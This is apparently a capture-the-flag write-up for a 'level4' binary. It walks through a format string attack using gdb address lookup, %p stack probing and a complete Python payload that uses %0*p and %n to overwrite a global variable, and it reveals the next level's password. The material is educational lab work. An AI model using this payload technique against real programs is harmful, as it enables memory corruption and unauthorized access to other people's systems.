## Press printf's f for fun and profit episode II (level4)

This level's [binary](source.c) is once again fairly similar to the last one. It
takes user input and prints it back to stdin. Here the input buffer is also
directly given to printf, which means we can perform an other
[format string attack](https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b).
We also still have the same _m_ global variable that needs to be set to a given
value to pass a condition. This time, the binary will directly print the next
level's password if _m_ equals 0x1025544 (16930116).

So first, let's get _m_'s address:

```shell
# run gdb on the binary
gdb ./level4
# get the address
(gdb) i addr m
Symbol "m" is at 0x8049810 in a file compiled without debugging.
```

Now we can try adding some conversions to the format string to pop random values
from a stack and when we reach our buffer:

```shell
aaaabbbbccccdddd %p %p %p %p %p %p %p %p %p %p %p %p %p | ./level4
aaaabbbbccccdddd 0xb7ff26b0 0xbffffb84 0xb7fd0ff4 (nil) (nil) 0xbffffb48 0x804848d 0xbffff940 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x62626262
```

We start reaching our buffer at the 12'th conversion. Now we need to find a way
to make printf's output 16930116 characters long. The best way to do that is to
use * to pass an int argument from the stack as a field width specifier.

Here's the magic payload:

```shell
# feed the exploit payload to the binary
python -c 'print "\x01\x02\x54\xda"[::-1] + 4 * "a" + "\x08\x04\x98\x10"[::-1] + "%p%p%p%p%p%p%p%p%p%p%p%0*p%n"' | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

It works. The first value here is the number is last p conversion's field width.
This is the number we want to write in _m_ minus the length of the string
returned by printf. Then we have 4 padding bytes for the last %p conversion, and
then the address of _m_ we pass to %n.
